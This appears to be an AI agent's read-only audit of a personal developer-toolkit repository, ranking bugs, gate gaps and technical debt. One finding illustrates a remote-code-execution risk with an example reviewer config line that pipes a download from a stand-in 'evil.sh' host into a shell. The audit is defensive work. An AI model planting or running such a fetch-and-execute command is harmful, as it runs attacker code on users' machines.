# 03: Architecture, tools/scripts audit and debt ledger (ponytail lens)

**Method.** I loaded the skills `ponytail:ponytail-audit`, `ponytail:ponytail-review` and `ponytail:ponytail-debt`, and this report follows their method: map first, every finding gets a concrete case, findings are ranked from correct and safe down to lean, the debt ledger is built from `shortcut:` markers, and no code was changed.

**Trees.**
- **Review tree (R):** `review-v13` at `0acbd06`, the tip of `gsd/v1.3-curated-config-v2`.
- **Base checkout (B):** `~/git/personal/ai-kit` on `main` at `de7dcbb`.
- File:line citations refer to R unless they are marked `main:`.

**What I ran.** Everything was read-only. Lint and type checks:
- ruff 0.15.18, pylint, pyright and vulture used B's `.venv/bin`, because R's `.venv` has no tools installed: `ls R/.venv/bin` shows only `python` and the activate scripts.
- `uv run` failed in R with `Failed to spawn: ruff`.

Tests and probes:
- Each test module was run separately, with timing.
- Probes ran only in my scratchpad: a sandbox `HOME` with symlinked skills, a fake `git` for `install.sh`, and a status-line timing run.
- `git ls-remote` over HTTPS, which is read-only.

Nothing was written outside my scratchpad.

**Confidence labels.**
- **Verified:** I ran the check, or read the exact code path.
- **Inference:** reasoned from code, not run.

---

## What this repo does

ai-kit is a personal toolkit. Its main parts:
- agent skills (spec review and execution routing, the project-rules checkers, curated GSD config, usage metrics);
- a status line;
- a TUI setup wizard and a config doctor;
- session-start hooks;
- a `curl | bash` installer.

The installer symlinks the skills into `~/.claude/skills`. The runtime is stdlib-only Python 3, and dev tooling comes through `uv`.

**Load assumed.** One user on one machine. But that user often runs several agent CLIs **in parallel** against the same `$HOME` caches and config. This research run alone uses 9 parallel agents. So "two processes write the same file at once" is a realistic case, not an exotic one.

---

## Findings (ranked)

### Must fix

1. **A cloned repo can run any shell command when you review a spec in it** (`skills/ai-kit-spec-review/ai_kit_spec/config_io.py:65-81`, `quota.py:231-237`, `dispatch.py:70`)
   - **What this is:** Cross-AI review reads its reviewer list from `<cwd>/.aikit/review-spec.toml` (a project-local config), merged with the global one. Each reviewer has a `command` template, which is run with `shell=True` (passed to a shell, so any shell syntax works).
   - **Problem:** The project-local file is trusted with no check. `--cross-ai` is the **default** (`SKILL.md:15`). The default flow runs `probe-quota --cwd <CODEBASE_ROOT>` (`references/cross-ai-dispatch.md:149`), and that runs each reviewer's `command` (`quota.py:236`). Only `{prompt}` is escaped; `{model}` and the extra fields are not (`commands.py:378-389`).
   - **Concrete case:** A repo commits `.aikit/review-spec.toml` with `command = "curl evil.sh | sh #{prompt}"`. You clone it and say "review my plan". The command runs on your machine before any review happens.
   - **Fix:** In `cfg_resolve`, refuse local `reviewers[].command` entries when the local file is tracked by git (`git ls-files --error-unmatch .aikit/review-spec.toml` succeeds), and print one warning. The configs that `ai-kit-spec-config` writes itself are untracked, so they keep working. That is about 6 lines and one test.
   - **If we skip it:** Reviewing a spec in someone else's repo is remote code execution by design.
   - **Evidence and confidence:** I read the code path end to end (verified). I did not test it with a live malicious config.

2. **No quality gate runs anywhere: not on commit, not on push, not in CI** (`main:.git/config`, `.gitlab-ci.yml`)
   - **What this is:** `make dev` installs pre-commit hooks for both pre-commit and pre-push (`.pre-commit-config.yaml:10`). The pre-push stage holds pyright, vulture and all the unit tests.
   - **Problem:** The real breakage is worse than "the hook points to a missing venv". The repo-local `.git/config` sets `core.hooksPath=/home/user-zero/git/personal/ai-kit/.git/hooks` (`git config --show-origin` → `file:.git/config`). That directory does not exist (`ls /home/user-zero` → no such file), so git runs **no hooks at all**. No pre-push hook was ever installed either: `.git/hooks` holds only `pre-commit`. `.gitlab-ci.yml` declares a `test` stage but defines no job in it; only secret detection runs.
   - **Concrete case:** At the tip, the ruff hook's own file set fails with 12 errors on R and 25 on main, so `make validate` is red today:
     - R: `tools/status-line.py` 6, `tools/wizard_app.py` 2, `tests/test_ai_kit_spec_superpowers.py` 4;
     - main: the same plus 13 in `tests/test_ai_kit_spec.py`.

     Commits land anyway.
   - **Fix:**
     - Run `git config --unset core.hooksPath`, then `make dev`. That is a local config change, for the user to make.
     - Add one CI job, `test: script: [make test-unit arch-test]`.
   - **If we skip it:** Every gate in the repo is decoration. Lint debt has already survived 3 milestones this way (see the ledger).
   - **Confidence:** Verified (commands above).

3. **`ai-kit-gsd-curated-config` loads the *installed* `ai_kit_spec`, not its own sibling, so the v1.3 branch tests itself against main's code** (`skills/ai-kit-gsd-curated-config/ai_kit_gsd_curated_config/model_detect.py:26-46`, `cross_ai_build.py:21-34`, `preference_match.py:27-28`)
   - **What this is:** The skill imports `build_execute_command` and the ranker from the `ai-kit-spec-review` skill. To find it, it searches `$CLAUDE_PLUGIN_ROOT`, then **`~/.claude/skills/ai-kit-spec-review`**, and only then its own sibling directory. It then does `sys.path.insert(0, …)` on the first hit.
   - **Problem:** `~/.claude/skills/ai-kit-spec-review` is a symlink to B, which is on `main`. Between main and the branch, `ai_kit_spec` differs by 842 inserted and 107 deleted lines (`git diff --stat main 0acbd06 -- skills/ai-kit-spec-review/ai_kit_spec`).
   - **Concrete case:** In R, `python3 -c "import …cross_ai_build; import ai_kit_spec; print(ai_kit_spec.__file__)"` printed `~/.claude/skills/ai-kit-spec-review/ai_kit_spec/__init__.py`. So the branch's curated-config code, and `tests/test_ai_kit_gsd_curated_config.py`, which only adds its own skill dir to the path (`:13-16`), run against **main's** `ai_kit_spec`.
     - The result also depends on test order. If `test_ai_kit_spec` runs first in the same process, the worktree copy is already in `sys.modules`.
   - **Fix:** Put the sibling directory first in the candidate list, so a checkout or worktree always uses its own copy. `~/.claude/skills` becomes a fallback only. This reorders 3 lines in `resolve_ai_kit_spec_path`. Its test at `test_ai_kit_gsd_curated_config.py:512-549` pins the current order and needs the same change.
   - **If we skip it:** Branch tests can pass or fail because of the code on main. Phases 17–20 build exactly on this import.
   - **Confidence:** Verified (probe output above).

4. **`install.sh --branch X` silently installs main on any machine that already has a git install, and `--dry-run` still pulls** (`tools/install.sh:98-100`, `:173-176`)
   - **What this is:** The README says `--branch <name>` lets you "try a branch without merging it" (`README.md:378-393`), and that `--dry-run` will "mutate nothing" (`README.md:375`).
   - **Problem:** When `$INSTALL_DIR/.git` exists, `fetch_repo` runs `git pull --ff-only`. That ignores `REPO_BRANCH` and `AI_KIT_REPO`; the clone is also `--single-branch --depth 1`. The fetch also runs before `--dry-run` is ever looked at.
   - **Concrete case:** I probed it with a fake `git` and an existing `.git` dir, running `bash -s -- --branch feat/x --dry-run`. The output was `fake-git -C …/dir pull --ff-only`, then `setup.py args ['--dry-run']`. The branch was dropped, and the install dir was mutated during a dry run. `tests/test_install.sh:107-152` only covers a fresh clone.
   - **Fix:**
     - For the branch: if `.git` exists and a branch was asked for, run `git -C "$INSTALL_DIR" fetch --depth 1 origin "$REPO_BRANCH" && git -C "$INSTALL_DIR" checkout -B "$REPO_BRANCH" FETCH_HEAD` instead of `pull`.
     - For the dry run: skip `fetch_repo` when `--dry-run` is in `ARGS`.
     - About 8 lines, plus one more fake-git case in `test_install.sh`.
   - **If we skip it:** The documented way to test a branch reports success while running main code. A "dry run" changes the install.
   - **Confidence:** Verified (probe).

### Should fix

5. **Linking one execution skill without `ai-kit-spec-review` crashes it; the installer has no idea skills depend on each other** (`skills/ai-kit-spec-execute-superpowers/ai-kit-spec-superpowers.py:10-12`, `skills/ai-kit-spec-execute-gsd/ai-kit-spec-gsd.py:14-15`, `tools/setup.py:1297-1344`)
   - **What this is:** `setup.py --headless --skills=a,b` links just the skills you name. The two execution skills both import `ai_kit_spec` from the sibling `ai-kit-spec-review` directory, but each finds it in a different way:
     - the superpowers shim uses `os.path.dirname(_HERE)`, a **text-only** parent;
     - the gsd shim uses `os.path.join(_THIS_DIR, "..", …)`, which the kernel resolves through the symlink.
   - **Concrete case:** In a sandbox `HOME` holding only the `ai-kit-spec-execute-superpowers` link, the shim fails with `ModuleNotFoundError: No module named 'ai_kit_spec'`. The gsd shim works in the same sandbox, but only by luck of how `..` resolves.
   - **Fix:** Make the superpowers shim match the gsd one: `os.path.join(_HERE, "..", "ai-kit-spec-review")`, one line. Then add a test that each shim imports from a sandbox holding only its own link. A longer-term fix is in the architecture section below.
   - **If we skip it:** A partial install breaks with a traceback, not a clear message.
   - **Confidence:** Verified (sandbox probe).

6. **The lint gate skips the most central library in the repo** (`.pre-commit-config.yaml:20`, `:30`, `pyproject.toml:94`, `:100`)
   - **What this is:** Ruff, py-compile, pylint, pyright and vulture each use a hand-written allow-list of paths.
   - **Problem:** The ruff hook's `files:` regex leaves out **36 of 191 tracked `.py` files (6,861 lines)**. The `ai-kit-spec-review` and superpowers entries are the shipped-code gaps:
     - `skills/ai-kit-spec-review/` has 22 files and 4,507 lines, and **none** of them is matched. The regex names `skills/ai-kit-spec-review/ai-kit-spec-review.py`, a file that does not exist; the shim is now `ai-kit-spec.py`. This is the `ai_kit_spec` hub library that 3 other skills import.
     - `skills/ai-kit-spec-execute-superpowers/` has 5 files and 802 lines. The regex has `skills/ai-kit-spec-execute/.*`, which needs a `/` after `execute`, so it misses `-superpowers`.
     - `cst-refactor` (455 lines), `markdown-to-pdf` (308), `mermaid-audit` (627) and the `docs/` prototypes (662) are also out.
     - Pylint covers only 3 files (`:26`). Pyright and vulture leave out `ai_kit_spec`, `ai_kit_spec_gsd`, `ai_kit_spec_superpowers` and `opencode-providers`.

     I computed these by matching each hook's regex against `git ls-files '*.py'`.
   - **Concrete case:** Phase 16's WR-02..WR-04 lint findings reached a commit because of exactly this gap (`.planning/phases/16-ai-kit-spec-extensions/16-REVIEW-FIX.md:30`).
   - **Fix:** Change the ruff hook to `files: \.py$` with `exclude: ^(docs|\.planning)/`.
     - Only 2 new errors appear in shipped skill code: `ai_kit_spec/dispatch.py:158` SIM105 and `ai_kit_spec_superpowers/task_classification.py:11` I001.
     - `markdown-to-pdf` and `mermaid-audit` add 16 more (6, 5 and 5). Fix them, or exclude those two folders for now.
     - Do the same for py-compile, and add `skills/ai-kit-spec-review` and `skills/ai-kit-spec-execute-*` to pyright's `include`.
   - **If we skip it:** The hub library collects lint and type debt with no signal.
   - **Confidence:** Verified (regex computation plus ruff run).

7. **Three hand-kept test lists have drifted apart** (`Makefile:46`, `.pre-commit-config.yaml:59`, `:67`)
   - **Problem:** `make validate` runs the pre-push `unittest` and `unittest-wizard` lists, and they leave out 6 test modules: `test_ai_kit_spec_superpowers`, `test_framework_profiles`, `test_markdown_to_pdf`, `test_mermaid_style`, `test_system_memory_e2e` and `test_worktree_e2e`. `test_config_doctor` runs in both hook lists.
   - Every new test module must be added by hand to 2–3 lists. `make test` does currently cover all 30 modules, which I checked by script.
   - **Fix:** Point the hook entries at the Make targets (`make test-unit arch-test`, `make test-integration`), or use `python3 -m unittest discover -s tests -p 'test_*.py'`. Then a single list remains.
   - **If we skip it:** `make validate` passes while the 61 superpowers tests and the e2e flows are never run by it.
   - **Confidence:** Verified.

8. **Cache writes in `ai_kit_spec` use one fixed temp name, so two processes can lose or corrupt `.planning/config.json` or the quota file** (`skills/ai-kit-spec-review/ai_kit_spec/cache.py:21-29`)
   - **What this is:** `cache_write_json` writes to `path + ".tmp"` and then calls `os.replace`. It writes:
     - the quota cache (`cli.py:1120`, `ai_kit_spec_gsd/cli.py:142`, `ai_kit_spec_superpowers/cli.py:226`);
     - the model catalog (`cli.py:1059`, `:1087`, `:1111`);
     - **GSD's own `.planning/config.json`** (`ai_kit_spec_gsd/gsd_config.py:66-177`).
   - **Problem:** Two parallel agents probing quota, or one probing while another dispatches, open the same `.tmp` with mode "w". The later open truncates the earlier writer's data. The first `os.replace` moves the shared file away, so the second one raises `FileNotFoundError`. A fresh file also replaces the old one with umask permissions and no trailing newline.
   - **Fix:** Copy the 8-line `mkstemp` + `fsync` + `os.replace` + cleanup body that `_shared/ai_kit_rules_common/stack_cache.py:107-118` already uses. Read-modify-write races on the quota file stay possible, but they are only a lost update of a cache, which is acceptable.
   - **If we skip it:** You get rare crashes, or GSD config overwritten mid-run, when several agents work at once (this repo's normal mode).
   - **Confidence:** The fixed temp name is verified (code). The collision is an inference (not reproduced); medium.

9. **Uninstall rewrites `~/.claude/settings.json` without an atomic write** (`tools/setup.py:1387-1392`, `:1788`)
   - **What this is:** `setup.py` has a careful `_atomic_write_json` (`:1429-1460`) and uses it everywhere, except `unwire_statusline`, which calls the plain `_write_json` (`open(path, "w")`).
   - **Concrete case:** If `install.sh --uninstall` is killed, or the disk is full, during that write, the user's whole Claude settings file is left truncated. That is the exact corruption the `_read_json_checked` docstring says the project must never cause (`:1412-1416`).
   - **Fix:** Replace `_write_json(settings, data)` with `_atomic_write_json(settings, data)` and delete `_write_json`, which then has no callers (I grepped: only `:1788`). That removes 6 lines.
   - **If we skip it:** A small chance of destroying the user's settings on uninstall.
   - **Confidence:** Verified (code and grep).

10. **`ai_kit_spec/cli.py:main` is one 663-line function** (`skills/ai-kit-spec-review/ai_kit_spec/cli.py:647`)
    - **Problem:** It contains 21 `if args.command == …` branches, which pylint measures as 306 statements, 61 branches and 101 locals. A second function at `:351` has 91 statements. It is the busiest file in the hub library, and no linter gate covers it (finding 6).
    - **Fix:** Split by job: one `_cmd_<name>(args, deps)` per subcommand, and `main` keeps only the argparse setup and a dict dispatch. This is a pure move with no behavior change; the 594 tests in `test_ai_kit_spec` already pin the behavior.
    - **If we skip it:** Every new subcommand adds more locals to a function that is already hard to review.
    - **Confidence:** Verified (pylint).

11. **The rules-cache staleness value is written down two ways, and the gap is known and left open** (`skills/_shared/ai_kit_rules_common/stack_cache.py:27` = `30`, `.planning/intel/constraints.md:48` = 180 days)
    - **Problem:** The precommit skill's own docstring records the gap, noting it is "the second phase to observe it unfixed" (`ai_kit_project_rules_precommit/stack_cache.py:6-11`). With 30 days, each stack's cached tooling research expires 6x sooner than the spec says.
    - **Fix:** Pick one value and change the other. That is a one-line edit plus a docstring cut.
    - **If we skip it:** The rule and the spec disagree forever, and a third phase will re-log the same gap.
    - **Confidence:** Verified.

12. **The public one-liner installs a build 283 commits old** (`tools/install.sh:5`, `:36`)
    - **Problem:** `install.sh` fetches `castocolina/ai-kit` on GitHub. `git ls-remote https://github.com/castocolina/ai-kit.git refs/heads/main` → `b30c0b2` (2026-09-12). Local `main` is 283 commits ahead, with 84 files and +12,641 lines in `tools/` and `skills/` since then. The GitLab remote did not answer within 20 s.
    - **Fix:** This is a process choice, not code: push main to the remote the one-liner reads from, or point the one-liner at the remote you do push to.
    - **If we skip it:** Anyone using the README one-liner, the user included on a new machine, gets a build missing most of v1.2.
    - **Confidence:** Verified (ls-remote, rev-list).

13. **`docs/architecture/` holds one stale document** (`docs/architecture/status-line-pipeline.md`)
    - **Problem:** It was last changed on 2026-06-21 (`b22288d`), and `tools/status-line.py` has had 38 commits since. It names 7 functions that exist nowhere in `tools/`, `skills/` or `tests/`: `build_theme`, `_crown_slowest`, `git_snapshot`, `load_config`, `pack_line`, `_place_external` and `safe_build` (`git grep -lw` returned nothing). Only one PRD links to it (`docs/prds/status-line-architecture-pattern-v1.0-prd.md:11`).
    - **Fix:** Delete it, or regenerate it from `tests/test_arch.py`'s banner blocks, which are the enforced truth.
    - **If we skip it:** New agents read a pipeline that no longer exists.
    - **Confidence:** Verified.

### Nice to have (lean)

14. **Delete 7 pure re-export shims** (`skills/ai-kit-project-rules-{agents,arch,cicd,docker,makefile,precommit}/*/remediation.py` and `ai-kit-project-rules-agents/*/tool_presence.py`, 12 lines each)
    - Each one only re-exports `ai_kit_rules_common.<x>`, and each has exactly one importer: its own `cli.py` (grep).
    - Change those 7 import lines to `from ai_kit_rules_common.remediation import build_remediation` and delete the files: **-84 lines**.

15. **Merge the two session-start hooks** (`tools/hooks/claude_session_start.py`, `cursor_session_start.py`, 88 lines each)
    - `_drain_stdin` and `main` are the same in both; only `emit()`'s envelope differs (diff above).
    - Move `_drain_stdin` and a `run(emit)` into `detect.py`. Each wrapper then keeps about 15 lines: **-~45 lines**.

16. **The same atomic-write helper exists about 10 times; merge the copies that can legally import each other**
    - The `os.replace` sites are:
      - `tools/setup.py:470`, `:505`, `:1454` (plus `_atomic_write_executable` at `:761`);
      - `tools/config_doctor_appliers.py:49`, `:93`, `:130`;
      - `skills/_shared/ai_kit_rules_common/stack_cache.py:114`;
      - `skills/ai-kit-opencode-providers/…/atomic_write.py:53`;
      - `skills/ai-kit-spec-review/…/cache.py:29`;
      - `skills/ai-kit-usage-metrics/…/raw_store.py:54`;
      - `skills/ai-kit-usage-metrics/…/dashboard.py:2015`.
    - Several are commented as "ported" or "adapted rather than imported" (`setup.py:1432-1434`, `raw_store.py:37`, `dashboard.py:2001`).
    - Inside `tools/`, `setup.py` already imports `config_doctor_*` (`:2972-2973`), so it can import `config_doctor_appliers.atomic_write_json` and drop its own copy: **-~30 lines**.
    - Inside `ai_kit_spec`, `_VALID_NATIVE_RUNTIME` is "deliberately duplicated" between `config_io.py:97-100` and `model_catalog.py:50-53`. `config_io` imports nothing from `ai_kit_spec`, so it can import the other copy with no import cycle: **-3 lines**, and one fewer "must change together" note.

17. **Delete superseded prototypes and committed scratch work**
    - **The wizard prototype:** `docs/wizard-redesign/prototypes/mockup-textual.py` and `_protodata.py` (662 lines, 11 ruff errors). `tools/wizard_app.py` is the "faithful port" of them (`tests/test_wizard_app.py:3`); git keeps the history.
    - **The scratch tree on main:** `main:.planning/docs/system-one-decision-skill/scratchpad/` is 82 tracked files (262 under `.planning/docs`, 1.5 MB). It includes 4 copies of `jev_review.py` and alone pushes `ruff check .` on main from 41 to 256 errors.
    - Keep `PLAN.md` and `README.md`; drop `scratchpad/` and `review-history/*.err|*.out`.

18. **The "mmdc real-render failure" is a PATH-order problem, not a code problem** (`tests/test_markdown_to_pdf.py:73-80`)
    - I ran `tests.test_markdown_to_pdf.TestRenderRealMmdc` with each `mmdc` (the Mermaid CLI) first on `PATH`:
      - with the linuxbrew `mmdc` 11.17.0 first, it **passes**;
      - with `PATH="$HOME/.local/share/pnpm/bin:$PATH"` it **fails** with `Cannot find module '…/pnpm/global/v11/…/@mermaid-js/mermaid-cli/src/cli.js'`.
    - `skipUnless(shutil.which("mmdc"))` only checks that the program exists, not that it runs. The production code raises a typed `MermaidRenderError` (`render_mermaid.py:86`), so the code is correct.
    - **Fix (environment):** Remove the broken pnpm-global mermaid-cli shim (`pnpm rm -g @mermaid-js/mermaid-cli`). That is the user's call, since it is a package change.
    - **Optional (test):** Skip when `mmdc --version` exits non-zero. That is 2 lines.
    - The v1.2 audit item (`milestones/v1.2-MILESTONE-AUDIT.md:31`) is therefore stale on today's default `PATH`.

I left out 6 smaller items:
- `tool_catalog.py:280` uses a loop variable after the loop (pylint W0631);
- `mermaid_style.py:310` has an unused `node_count`;
- `setup.py:3042` runs a constant `curl | sh` for uv, with prompt and comment, so it is accepted;
- the palette is copied verbatim between `wizard_app.py` and `config_doctor_app.py`;
- the modern-tool list is kept in two shapes (`tools/hooks/detect.py:24-28` and `_shared/…/tool_presence.py:14`; `tools/` may not import `skills/`);
- `make lint` keeps its own py_compile file list, which differs from the hook's, against its own comment at `Makefile:78-79`.

---

## Scope A: tools, scripts, build and tests

### Tool inventory (facts)

| File | Lines | In ruff hook | In pylint hook | In pyright | In vulture |
|---|---|---|---|---|---|
| tools/setup.py | 3166 | yes | yes | yes | yes |
| tools/status-line.py | 2618 | yes (6 errors) | yes (6 msgs) | yes | yes |
| tools/config_doctor_checks.py | 1054 | yes | no | yes | no |
| tools/wizard_app.py | 963 | yes (2 errors) | no | no | no |
| tools/config_doctor_appliers.py | 386 | yes | no | yes | no |
| tools/statusline-doctor.py | 331 | yes | yes | yes | yes |
| tools/config_doctor_app.py | 253 | yes | no | yes (5 env errors*) | no |
| tools/config_doctor_readers.py | 231 | yes | no | yes | no |
| tools/install.sh | 189 | shellcheck | n/a | n/a | n/a |
| tools/hooks/*.py | 329 | yes | no | yes | no |

\*Pyright's only 5 errors are `Import "textual…" could not be resolved` in `config_doctor_app.py:12-16`. This comes from R's empty `.venv`, so it is not code debt.

### Status line speed

`python3 -S tools/status-line.py < tests/fixtures/sample-input.json` took **0.03–0.04 s** over 5 runs (sandbox `HOME`). That is fine for a render on every prompt.

### Tests: structure and speed

All 30 modules pass in R using B's venv python. Per-module wall time:
- `test_wizard_app` 11.4 s;
- `test_wizard_pty` 8.7 s;
- `test_config_doctor_pty` 7.1 s;
- `test_ai_kit_gsd_curated_config` 4.0 s;
- `test_tool_substitution_hook` 2.7 s;
- all others under 1.5 s.

That is about 42 s in total. The 3 Textual/PTY modules are 65% of it. The suite needs no speed work; it does need one test list (finding 7).

The tiers are:
- `test-unit`: 22 modules;
- `test-integration`: 3;
- `e2e-test`: 3 plus `tests/test_install.sh`;
- `arch-test`: 1 (`Makefile:46-67`).

I did not run `tests/test_install.sh` or `make e2e-docker`.

### Architecture test

`tests/test_arch.py` enforces 7 AST rules, but **only for `tools/status-line.py`** (`:1-25`). No test checks dependency direction across `tools/` and `skills/`. ROADMAP 999.3 says this is "an explicitly-flagged known gap, not built by Phase 12" (`.planning/ROADMAP.md:302-330`).

---

## Scope B: architecture across `skills/`

### Dependency map (facts, from `grep -E '^\s*(from|import) ai_kit_'`)

| Consumer | Imports | How it finds the code | Fails how |
|---|---|---|---|
| 7 `ai-kit-project-rules-*` skills | `skills/_shared/ai_kit_rules_common` | each package `__init__.py` resolves `realpath(__file__)/../../_shared`, then `sys.path.append` (7 copies of ~26 lines, e.g. `ai_kit_project_rules_makefile/__init__.py:6-26`) | raises `ImportError` with a message, "by design", in copy-installs (`ai-kit-project-rules-agents/SKILL.md:28`) |
| ai-kit-spec-execute-gsd | `skills/ai-kit-spec-review/ai_kit_spec` (11 imports) | shim joins `_THIS_DIR/../ai-kit-spec-review` (`ai-kit-spec-gsd.py:14-15`) | works through the symlink |
| ai-kit-spec-execute-superpowers | `ai_kit_spec` (9 imports) | shim takes the text-only `dirname(_HERE)/ai-kit-spec-review` (`ai-kit-spec-superpowers.py:10-12`) | `ModuleNotFoundError` when the sibling link is missing (finding 5) |
| ai-kit-gsd-curated-config | `ai_kit_spec` (2 imports) | `resolve_ai_kit_spec_path`: plugin root → `~/.claude/skills` → sibling, wrapped in try/except | silently degrades to `None`; uses the wrong copy in a worktree (finding 3) |
| tools/ | nothing from skills/ | a rule written only as a comment (`setup.py:1432-1434`) | n/a |
| SKILL.md files | other skills by path | 16 SKILL.md files hard-code `$HOME/.claude/skills/<name>` or the plugin root | breaks for hosts that do not use `~/.claude/skills` |

### Where the shape fights the purpose

- **There are two shared libraries, and one of them is hidden inside a skill.**
  - `_shared/ai_kit_rules_common` is the official home, but only the rules family uses it.
  - `ai-kit-spec-review/ai_kit_spec` (22 files, 4,507 lines) is the real hub: 3 other skills import it, by 3 different path tricks.
  - It is also the code the gates watch least (finding 6).
  - *Smallest fix, inference:* move `ai_kit_spec` under `skills/_shared/` and give every consumer the one realpath bootstrap the rules skills already use. One mechanism instead of four.
- **The kit claims to be multi-CLI, but installs for one CLI.**
  - `setup.py` links skills only under `claude_dir/skills` (`setup.py:59-66`, `:1344`).
  - The rules skills document that they *must* fail in opencode and `~/.agents` copy-installs.
  - Hosts that read `~/.claude/skills` work only because they follow the symlink.
  - Confidence: medium. I did not check each host's skill search path live.
- **Skills declare no dependencies.** `--skills=` lets you link a skill without the skill it imports (finding 5). A one-line `requires:` list in the frontmatter, which `apply_additive_skills` would also link, would close this. *Inference.*
- **Nothing enforces import direction** (999.3's known gap). One AST test of about 30 lines would lock down the whole map above. It would assert:
  - `tools/` never imports `skills/`;
  - skills import only `_shared` and their own package;
  - every shim resolves its sibling through the symlink.

### Duplicated helpers: `_shared` versus the skill packages

- `_shared` is used cleanly. The v1.2 audit's "no divergent copies" holds (`v1.2-MILESTONE-AUDIT.md:61`).
- The leftovers are pure pass-through layers:
  - the 7 re-export shims (finding 14);
  - the two `stack_cache.py` namespace wrappers (`ai_kit_project_rules_makefile/stack_cache.py`, `…precommit/stack_cache.py`, about 50 lines each, 4 one-line delegating functions). These are acceptable, since they bind a namespace.
- Real duplication sits **between** `tools/` and `skills/`, where the layering rule bans imports: the atomic-write copies, the modern-tool lists and the palette (findings 15 and 16).

---

## Scope C: debt ledger

### C1. Ponytail `shortcut:` marker ledger

I ran `grep -rnE --exclude-dir=.git --exclude-dir=.venv '(#|//|/[*]) ?(shortcut|ponytail):' .`:
- **R (v1.3 tip): 0 hits.**
- **B (main): 16 hits**, all under `.planning/docs/system-one-decision-skill/`.
- Without the comment-prefix filter, main has 19 hits; the 3 extra are prose in `PLAN.md` and `review-history/*.txt`.

The 16 hits are copies of **3 distinct shortcuts**:

`.planning/docs/system-one-decision-skill/PLAN.md`
- `:596`: batch review runs sequentially. ceiling: sequential. upgrade: switch to a thread pool if batches grow past ~50 items.
- `:696`: free-tier 429 handling. ceiling: no cooldown memory. upgrade: add a timestamp file if free 429s become frequent.

`.planning/docs/system-one-decision-skill/scratchpad/jb/scripts/jev_review.py`
- `:124`: probability-sum tolerance 1e-3. ceiling: not yet observed live for noul/score. upgrade: widen further if real Zen responses round more coarsely.
- `:346`: same as PLAN.md:596 (sequential batch).
- `:455`: same as PLAN.md:696 (no cooldown memory).

`.planning/docs/system-one-decision-skill/scratchpad/v3/skill/scripts/jev_review.py`
- `:122`, `:366` and `:453`: the same three shortcuts.

`.planning/docs/system-one-decision-skill/scratchpad/v3/skill.pre-calibrate/scripts/jev_review.py`
- `:122`, `:366` and `:453`: the same three.

`.planning/docs/system-one-decision-skill/scratchpad/v3/skill/notes/jev_review.py.before-calibrate`
- `:122`, `:366` and `:453`: the same three.

`.planning/docs/system-one-decision-skill/scratchpad/t3_a.txt`
- `:48`: same as the sequential batch.

`.planning/docs/system-one-decision-skill/scratchpad/t3_screen.txt`
- `:66`: same as the no-cooldown entry.

**16 markers, 0 with no trigger.**

**What this means.** I confirmed that every marker lives in planning scratch work for a skill that has not been built, and none in shipped code. ai-kit's own code (`tools/`, `skills/`, `tests/`) carries **no marked debt**. So all of its debt is **implicit**: in lint output, in audit frontmatter and in phase hand-offs. The ledger below gathers that implicit debt. The repo also turns off pylint's `fixme` check (`pyproject.toml:81`). It has no TODO markers anyway: `TODO|FIXME|XXX|HACK` in `tools/`, `skills/`, `tests/` and config hits only test data strings and the status line's "TODO" segment name.

### C2. Implicit debt from `.planning/`: never closed, or stale

Each entry gives the source, the item and its status today.

- **The lint debt in `tools/status-line.py`, `tools/wizard_app.py` and `tests/test_ai_kit_spec_superpowers.py`**
  - *Sources:* first deferred in v1.1 Phase 6 and 7 `deferred-items.md` (`milestones/v1.1-phases/07-curated-gsd-config-skill/deferred-items.md:11`, `v1.1-MILESTONE-AUDIT.md:14-17`, `:81`), then carried by `v1.2-MILESTONE-AUDIT.md:30` and `16-HANDOFF.md:134-137`.
  - *Status:* **Open, verified.** It has survived 3 milestones; finding 2 explains why.
- **The ruff hook scope misses `ai_kit_spec`**
  - *Sources:* `16-REVIEW-FIX.md:30`, `16-HANDOFF.md:138`.
  - *Status:* **Open.** It is wider than recorded: 36 files, including superpowers (finding 6).
- **`ai_kit_spec/dispatch.py:158` SIM105**
  - *Sources:* `16-REVIEW-FIX.md:29`, `16-HANDOFF.md:135`.
  - *Status:* **Open, verified.**
- **The broken pre-commit hook**
  - *Source:* `16-HANDOFF.md:155`.
  - *Status:* **Open, and worse than recorded.** It is `core.hooksPath`, so no hook runs at all, and pre-push was never installed (finding 2).
- **The mmdc real-render failure**
  - *Sources:* `v1.2-MILESTONE-AUDIT.md:31`, Phase 16 SUMMARYs.
  - *Status:* **Stale.** It passes on today's default `PATH` and fails only when pnpm's bin comes first (finding 18).
- **`STALE_AFTER_DAYS` 30 versus 180**
  - *Source:* `ai_kit_project_rules_precommit/stack_cache.py:6-11`.
  - *Status:* **Open, verified** (finding 11).
- **Dependency-direction and layering fitness tests**
  - *Source:* `ROADMAP.md:302-330` (999.3).
  - *Status:* **Open known gap** (Scope B).
- **Nyquist validation never run**
  - *Sources:* `v1.1-MILESTONE-AUDIT.md:20` (0/3), `v1.2-MILESTONE-AUDIT.md:33-38` (7 phases missing).
  - *Status:* **Open,** a process item. Phase 16 does have `16-VALIDATION.md`.
- **The Codex runtime signal is not live-verified**
  - *Source:* `16-VALIDATION.md:100`.
  - *Status:* **Planned,** deferred to Phase 20.
- **The pi signal is source-inspected only, and pi enumeration is deferred**
  - *Sources:* `16-02-SUMMARY.md:72`, `16-01-SUMMARY.md:69`.
  - *Status:* **Planned,** for Phase 22.
- **Curated-config v1 is kept intact next to v2**
  - *Source:* `18-CONTEXT.md:96` (D-08).
  - *Status:* **Open by decision.** Its fate is undecided.
- **The rules hand-off branch is not live-exercised, and the dashboard has no `--no-open`**
  - *Source:* `v1.2-MILESTONE-AUDIT.md:95-98`.
  - *Status:* **Accepted,** not debt.
- **WR-01/WR-02, the `pair_checks.py` pyright error and the 3 stale todos**
  - *Source:* `v1.2-MILESTONE-AUDIT.md:16-32`.
  - *Status:* **Closed** by Phase 15.2 (`ROADMAP.md:53`, `milestones/v1.2-ROADMAP.md:239`). `todos/completed/` holds the 3 files.
- **Backlog 999.1 (config-doctor shared core) and 999.2 (usage-metrics cron)**
  - *Source:* `ROADMAP.md:261-300`.
  - *Status:* **Open backlog.**

### C3. Lint debt today (read-only runs, counts per file)

**`ruff check .`** with the repo config: **41 errors on R**, and 256 on main (main's `.planning/docs` scratchpad adds 215).

R by file:

| File | ruff errors | In ruff hook scope |
|---|---|---|
| docs/wizard-redesign/prototypes/mockup-textual.py | 11 | no |
| skills/markdown-to-pdf/scripts/markdown_to_pdf.py | 6 | no |
| tools/status-line.py | 6 | **yes** |
| skills/mermaid-audit/scripts/audit_mermaid.py | 5 | no |
| skills/mermaid-audit/scripts/mermaid_style.py | 5 | no |
| tests/test_ai_kit_spec_superpowers.py | 4 | **yes** |
